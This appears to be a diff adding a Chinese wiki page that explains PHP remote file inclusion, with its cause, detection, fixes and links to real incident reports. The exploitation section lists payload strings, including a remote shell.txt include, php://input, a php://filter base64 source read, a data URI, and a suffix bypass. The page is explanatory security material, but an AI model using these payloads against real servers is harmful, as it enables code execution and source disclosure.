@@ -1,0 +1,59 @@
+====== 远程文件包含（Remote File Include） ======
+
+==== 1、漏洞简介 ====
+
+----
+如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括[[web:lfi|本地文件包含]]和远程文件包含两种形式。
+==== 2、漏洞成因 ====
+
+----
+文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在远程服务器上市，就形成的远程文件包含漏洞。
+==== 3、漏洞的检测及利用 ====
+
+----
+无通用的检测方法，但是大部分扫描器都支持远程文件包含漏洞的检测。
+
+以下是常用的引入远程文件的方法
+
+常见的协议：
+<code>[http|https|ftp]://example.com/shell.txt</code>
+(需要allow_url_fopen=On并且 allow_url_include=On)
+
+
+利用php流input：
+<code>php://input</code>
+需要allow_url_include=On,参考[[http://php.net/manual/zh/wrappers.php.php|php:// — 访问各个输入/输出流（I/O streams）]]，[[http://www.nowamagic.net/academy/detail/12220520|深入剖析PHP输入流 php://input]]
+
+
+利用php流filter：
+<code>php://filter/convert.base64-encode/resource=index.php</code>
+需要allow_url_include=On,参考[[http://php.net/manual/zh/wrappers.php.php|php:// — 访问各个输入/输出流（I/O streams）]]
+
+
+利用data URIs：
+<code>data://text/plain;base64,SSBsb3ZlIFBIUAo=</code>
+(需要allow_url_include=On)
+
+
+当服务器自动给文件增加后缀时可以在url之后增加'?'或者'#'，便可绕过。
+
+
+==== 4、漏洞修复 ====
+
+----
+对引入文件包含的参数进行过滤，或者对所引入的文件的域进行限制，禁止服务器访问可信域以外的文件。
+==== 5、实际案例 ====
+
+[[http://www.wooyun.org/bugs/wooyun-2010-059641|春秋航空某分站存在远程文件包含漏洞]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-0107969|爱爱医某站远程文件包含及mysql盲注]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-012031|华为某系统文件包含漏洞]]
+==== 6、相关资源 ====
+
+----
+[[http://drops.wooyun.org/tips/3827|PHP文件包含漏洞总结]]
+
+[[http://php.net/manual/zh/wrappers.php.php|php:// — 访问各个输入/输出流（I/O streams）]]
+
+[[http://www.nowamagic.net/academy/detail/12220520|深入剖析PHP输入流 php://input]]
